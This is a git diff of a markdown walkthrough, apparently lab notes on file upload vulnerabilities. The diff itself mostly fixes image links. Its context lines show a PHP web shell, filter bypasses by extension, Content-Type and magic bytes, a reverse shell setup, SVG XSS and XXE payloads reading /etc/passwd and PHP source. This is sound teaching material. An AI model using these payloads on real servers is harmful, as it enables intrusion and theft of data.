@@ -73,7 +73,7 @@ nikto -h 94.237.57.115:31571
 whatweb 94.237.57.115:31571 --aggression 3 --verbose 
 ```
 
-![Filtered output](...images/basic-exploitation2.png)
+![Filtered output](./.images/basic-exploitation2.png)
 
 Another effective approach is to fuzz for valid extensions using `ffuf`:
 
@@ -81,7 +81,7 @@ Another effective approach is to fuzz for valid extensions using `ffuf`:
 ffuf -w web-extensions.txt:FUZZ -u http://94.237.57.115:31571/indexFUZZ
 ```
 
-![Filtered output](...images/basic-exploitation3.png)
+![Filtered output](./.images/basic-exploitation3.png)
 
 Based on the results, we can confidently determine that the backend is implemented in `PHP`. We therefore prepare a simple PHP web shell:
 
@@ -91,7 +91,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 The file uploads successfully:
 
-![Filtered output](...images/basic-exploitation4.PNG)
+![Filtered output](./.images/basic-exploitation4.PNG)
 
 Clicking `Download file` reveals the upload directory:
 
@@ -99,7 +99,7 @@ Clicking `Download file` reveals the upload directory:
 http://94.237.57.115:31571/uploads/shell.php
 ```
 
-![Filtered output](...images/basic-exploitation5.PNG)
+![Filtered output](./.images/basic-exploitation5.PNG)
 
 Since the uploaded file is both accessible and executable, we can interact with the web shell via the `cmd` GET parameter:
 
@@ -107,7 +107,7 @@ Since the uploaded file is both accessible and executable, we can interact with 
 http://94.237.57.115:31571/uploads/shell.php?cmd=id
 ```
 
-![Filtered output](...images/basic-exploitation6.PNG)
+![Filtered output](./.images/basic-exploitation6.PNG)
 
 At this point, we have successfully achieved remote code execution (RCE) through an unrestricted file upload vulnerability.
 
@@ -163,7 +163,7 @@ We can now execute commands on the server through the `cmd` parameter:
 http://94.237.50.221:56396/uploads/shell.php?cmd=cd+/;cat+flag.txt
 ```
 
-![Filtered output](...images/web-shell2.png)
+![Filtered output](./.images/web-shell2.png)
 
 
 In addition to minimal one-liner shells, more advanced web shells provide a semi-interactive terminal interface. A popular example is `phpbash`, which offers a browser-based command shell.
@@ -181,7 +181,7 @@ To use `phpbash`, upload the `phpbash.php` file and navigate to its location:
 http://94.237.50.221:56396/uploads/phpbash.php
 ```
 
-![Filtered output](...images/web-shell.png)
+![Filtered output](./.images/web-shell.png)
 
 Interactive web shells like `phpbash` can significantly improve usability during manual post-exploitation but are more likely to be detected due to their size and complexity.
 
@@ -226,7 +226,7 @@ Download the script and modify the following variables:
 - `$ip = 'OUR_IP';`
 - `$port = OUR_PORT;`
 
-![Filtered output](...images/reverse-shell.png)
+![Filtered output](./.images/reverse-shell.png)
 
 Start a listener:
 
@@ -272,7 +272,7 @@ In this scenario, the target application allows users to upload a profile image:
 Update your profile image
 ```
 
-![Filtered output](...images/front-end-filter.PNG)
+![Filtered output](./.images/front-end-filter.PNG)
 
 When attempting to upload a PHP file named `shell.php`, the application returns the following error:
 
@@ -280,7 +280,7 @@ When attempting to upload a PHP file named `shell.php`, the application returns 
 Only images are allowed.
 ```
 
-![Filtered output](...images/front-end-filter2.PNG)
+![Filtered output](./.images/front-end-filter2.PNG)
 
 This indicates that file type validation is in place. However, when uploading the file, no HTTP request is sent to the server. This strongly suggests that validation is occurring **entirely on the client side**.
 
@@ -290,11 +290,11 @@ Inspecting the page source reveals that the upload functionality only permits fi
 - `jpeg`
 - `png`
 
-![Filtered output](...images/front-end-filter3.PNG)
+![Filtered output](./.images/front-end-filter3.PNG)
 
 To test the robustness of this validation, we rename `shell.php` to `shell.jpg` while keeping the file contents unchanged (i.e., still containing PHP code). The file uploads successfully:
 
-![Filtered output](...images/front-end-filter4.PNG)
+![Filtered output](./.images/front-end-filter4.PNG)
 
 This confirms that the application performs **extension-based validation only**, without inspecting the file contents. However, PHP code cannot be executed unless the file has a PHP-related extension.
 
@@ -308,7 +308,7 @@ Since validation occurs on the front end, we can bypass it by intercepting the u
 filename="shell.php"
 ```
 
-![Filtered output](...images/front-end-filter5.PNG)
+![Filtered output](./.images/front-end-filter5.PNG)
 
 After forwarding the modified request, the server accepts and stores the file. The upload location can be identified by inspecting the page source:
 
@@ -316,15 +316,15 @@ After forwarding the modified request, the server accepts and stores the file. T
 <img src='/profile_...images/shell.php' class='profile-image' id='profile-image'>
 ```
 
-![Filtered output](...images/front-end-filter7.PNG)
+![Filtered output](./.images/front-end-filter7.PNG)
 
 Finally, we navigate to the uploaded file and interact with the web shell using the `cmd` parameter:
 
 ```
-http://94.237.122.95:42771/profile_...images/shell.php?cmd=id
+http://94.237.122.95:42771/profile/images/shell.php?cmd=id
 ```
 
-![Filtered output](...images/front-end-filter6.PNG)
+![Filtered output](./.images/front-end-filter6.PNG)
 
 This confirms successful bypass of front-end validation and results in **remote code execution**.
 
@@ -350,7 +350,7 @@ However, when changing the extension to `.php`, the back-end server throws an er
 Extension not allowed
 ```
 
-![Filtered output](...images/blacklist-filter.PNG)
+![Filtered output](./.images/blacklist-filter.PNG)
 
 This confirms the presence of a **back-end blacklist filter**.
 
@@ -358,7 +358,7 @@ When keeping the `.jpg` extension, the upload succeeds—even though the file co
 
 To identify extensions that are not included in the blacklist, we can fuzz for allowed file extensions using `ffuf`. First, we save the intercepted upload request to a file:
 
-![Filtered output](...images/request.PNG)
+![Filtered output](./.images/request.PNG)
 
 We then use `ffuf` to fuzz the filename extension while filtering out responses containing the error message:
 
@@ -374,17 +374,17 @@ This reveals several allowed extensions, including:
 - `.php6`
 - `.phar`
 
-![Filtered output](...images/allowed-extensions.PNG)
+![Filtered output](./.images/allowed-extensions.PNG)
 
 Not all PHP-related extensions are supported by every web server configuration. Testing the discovered extensions shows that none of the `.php*` variants result in code execution.
 
 However, the `.phar` extension **is processed as PHP** by the server. Uploading the web shell with this extension successfully leads to remote code execution:
 
 ```
-http://94.237.51.160:49130/profile_...images/shell.phar?cmd=id
+http://94.237.51.160:49130/profile/images/shell.phar?cmd=id
 ```
 
-![Filtered output](...images/phar-rce.PNG)
+![Filtered output](./.images/phar-rce.PNG)
 
 This confirms that the blacklist filter can be bypassed by identifying an alternative executable extension supported by the server.
 
@@ -402,7 +402,7 @@ When attempting to upload uncommon PHP-related extensions such as `.phar` or `.p
 Only images are allowed
 ```
 
-![Filtered output](...images/whitelist-filter4.PNG)
+![Filtered output](./.images/whitelist-filter4.PNG)
 
 Error messages can be misleading, so rather than assuming the filter type, we fuzz for allowed extensions using the error message as a response filter:
 
@@ -412,7 +412,7 @@ ffuf -w web-extensions.txt:FUZZ -request req.txt -request-proto http -fr "Only i
 
 The results indicate that only `.php*` extensions pass this check.
 
-![Filtered output](...images/whitelist-filter5.PNG)
+![Filtered output](./.images/whitelist-filter5.PNG)
 
 However, when attempting to upload files using any of the allowed `.php*` extensions, the server responds with a different error message:
 
@@ -420,7 +420,7 @@ However, when attempting to upload files using any of the allowed `.php*` extens
 Extension not allowed
 ```
 
-![Filtered output](...images/whitelist-filter6.PNG)
+![Filtered output](./.images/whitelist-filter6.PNG)
 
 This behavior suggests that multiple validation layers are in place:
 
@@ -455,7 +455,7 @@ filename=shell.php.jpg
 filename=shell.jpg.php
 ```
 
-![Filtered output](...images/whitelist-filter7.PNG)
+![Filtered output](./.images/whitelist-filter7.PNG)
 
 This indicates the use of a **strict regular expression**, likely similar to the following:
 
@@ -539,16 +539,16 @@ One successful payload is:
 filename="shell.phar/.jpg"
 ```
 
-![Filtered output](...images/whitelist-filter9.PNG)
+![Filtered output](./.images/whitelist-filter9.PNG)
 
 
 Visiting the uploaded file confirms remote code execution:
 
 ```
-http://94.237.120.119:48470/profile_...images/shell.phar.jpg?cmd=id
+http://94.237.120.119:48470/profile/images/shell.phar.jpg?cmd=id
 ```
 
-![Filtered output](...images/whitelist-filter10.PNG)
+![Filtered output](./.images/whitelist-filter10.PNG)
 
 ---
 
@@ -564,7 +564,7 @@ When attempting to upload a file containing PHP code, the application responds w
 Only images are allowed
 ```
 
-![Filtered output](...images/content-type-filter.PNG)
+![Filtered output](./.images/content-type-filter.PNG)
 
 This error persists even when attempting previously discussed blacklist or whitelist bypass techniques. This behavior indicates that the application is validating uploads based on file content, either by inspecting the `Content-Type` header or by performing deeper file inspection.
 
@@ -589,7 +589,7 @@ Uploading a legitimate image succeeds as expected:
 File successfully uploaded
 ```
 
-![Filtered output](...images/content-type-filter2.PNG)
+![Filtered output](./.images/content-type-filter2.PNG)
 
 In this case, the browser sets the `Content-Type` to `.image/png`. When intercepting the request and changing the header to `text/plain`, the upload fails:
 
@@ -597,7 +597,7 @@ In this case, the browser sets the `Content-Type` to `.image/png`. When intercep
 Only images are allowed
 ```
 
-![Filtered output](...images/content-type-filter3.PNG)
+![Filtered output](./.images/content-type-filter3.PNG)
 
 This confirms that the application actively validates the `Content-Type` header.
 
@@ -609,7 +609,7 @@ A commonly used wordlist for this purpose is:
 
 Insert the `FUZZ` placeholder into the intercepted request and save it to a file:
 
-![Filtered output](...images/content-type-filter4.PNG)
+![Filtered output](./.images/content-type-filter4.PNG)
 
 Then fuzz the `Content-Type` header using `ffuf`:
 
@@ -623,7 +623,7 @@ The scan reveals that only the following `Content-Type` values are accepted:
 - `.image/png`
 - `.image/gif`
 
-![Filtered output](...images/content-type-filter5.PNG)
+![Filtered output](./.images/content-type-filter5.PNG)
 
 If the application relies only on the `Content-Type` header for validation, the filter can be bypassed by intercepting the upload request and changing the header to an allowed value.
 
@@ -661,7 +661,7 @@ GIF8
 <?php system($_GET["cmd"]); ?>
 ```
 
-![Filtered output](...images/mime-type-filter.png)
+![Filtered output](./.images/mime-type-filter.png)
 
 The file is now recognized as a GIF image by the `MIME` filter. This technique demonstrates that MIME-based validation alone is insufficient if executable content is not explicitly stripped or rendered inert after upload.
 
@@ -682,11 +682,11 @@ Inspection of the page source reveals a **front-end extension filter** that rest
 - `.jpeg`
 - `.png`
 
-![Filtered output](...images/exploitation.PNG)
+![Filtered output](./.images/exploitation.PNG)
 
 Uploading a legitimate `.png` image succeeds, confirming the expected behavior.
 
-![Filtered output](...images/exploitation2.PNG)
+![Filtered output](./.images/exploitation2.PNG)
 
 To identify additional server-side validation, the file extension is modified from `.png` to `.php` while keeping the file content unchanged.
 
@@ -698,7 +698,7 @@ Extension not allowed
 
 Because the file content is still a valid PNG image, this confirms the presence of a **back-end extension filter**.
 
-![Filtered output](...images/exploitation3.PNG)
+![Filtered output](./.images/exploitation3.PNG)
 
 We fuzz the upload endpoint for permitted extensions using `ffuf`, filtering on the error message:
 
@@ -712,7 +712,7 @@ The scan reveals several accepted extensions. The most relevant PHP-related exte
 - `.phar`
 - `.pht`
 
-![Filtered output](...images/exploitation4.PNG)
+![Filtered output](./.images/exploitation4.PNG)
 
 Next, we test whether the application validates the `Content-Type` header. Changing the header from `.image/png` to `text/plain` results in:
 
@@ -722,7 +722,7 @@ Only images are allowed
 
 This confirms the presence of a `Content-Type` filter.
 
-![Filtered output](...images/exploitation5.PNG)
+![Filtered output](./.images/exploitation5.PNG)
 
 We fuzz for accepted content types:
 
@@ -736,7 +736,7 @@ Only the following values are accepted:
 - `.image/png`
 - `.image/gif`
 
-![Filtered output](...images/exploitation6.PNG)
+![Filtered output](./.images/exploitation6.PNG)
 
 At this stage, the application enforces:
 
@@ -756,7 +756,7 @@ Even when using:
 Only images are allowed
 ```
 
-![Filtered output](...images/exploitation7.PNG)
+![Filtered output](./.images/exploitation7.PNG)
 
 This indicates that magic bytes are being inspected.
 
@@ -795,12 +795,12 @@ GIF8
 The uploaded file is now accessible and executable. Interacting with the web shell confirms successful code execution:
 
 ```
-http://83.136.253.5:49702/profile_...images/shell.gif.phar?cmd=id
+http://83.136.253.5:49702/profile/images/shell.gif.phar?cmd=id
 ```
 
 All upload defenses were successfully bypassed, resulting in remote code execution on the target server.
 
-![Filtered output](...images/exploitation9.PNG)
+![Filtered output](./.images/exploitation9.PNG)
 
 ---
 
@@ -850,7 +850,7 @@ Verify the injected metadata:
 exiftool picture.jpg
 ```
 
-![Filtered output](...images/limited-file-uploads.PNG)
+![Filtered output](./.images/limited-file-uploads.PNG)
 
 When the application displays this metadata in a web page without proper sanitization, the injected JavaScript executes in the victim’s browser.
 
@@ -869,7 +869,7 @@ An example malicious SVG file (`payload.svg`) is shown below:
 
 Once uploaded, the JavaScript payload executes whenever the SVG is rendered by the application, resulting in stored XSS.
 
-![Filtered output](...images/limited-file-uploads2.PNG)
+![Filtered output](./.images/limited-file-uploads2.PNG)
 
 ---
 
@@ -887,11 +887,11 @@ The following example demonstrates an XXE payload embedded inside an `SVG` file.
 <svg>&xxe;</svg>
 ```
 
-![Filtered output](...images/xxe.PNG)
+![Filtered output](./.images/xxe.PNG)
 
 When the file is processed and rendered, the contents of `/etc/passwd` are included in the output. **By inspecting the page source**, we can clearly observe the file contents:
 
-![Filtered output](...images/xxe2.PNG)
+![Filtered output](./.images/xxe2.PNG)
 
 In PHP-based environments, XXE vulnerabilities can often be escalated by leveraging **PHP stream wrappers**. One particularly useful wrapper is `php://filter`, which allows us to transform file contents before they are returned.
 
@@ -903,11 +903,11 @@ The following payload uses the `convert.base64-encode` filter to extract the sou
 <svg>&xxe;</svg>
 ```
 
-![Filtered output](...images/xxe3.PNG)
+![Filtered output](./.images/xxe3.PNG)
 
 Inspecting the page source reveals a Base64-encoded version of the file:
 
-![Filtered output](...images/xxe4.PNG)
+![Filtered output](./.images/xxe4.PNG)
 
 We can decode the output locally to recover the source code:
 
@@ -915,11 +915,11 @@ We can decode the output locally to recover the source code:
 echo "<base64 string>" | base64 -d
 ```
 
-![Filtered output](...images/xxe5.PNG)
+![Filtered output](./.images/xxe5.PNG)
 
 Applying the same technique to `upload.php` reveals critical implementation details, including:
 
-- The upload directory (`./...images/`)
+- The upload directory
 - File extension validation
 - Content-Type and MIME-type enforcement
 - File size restrictions
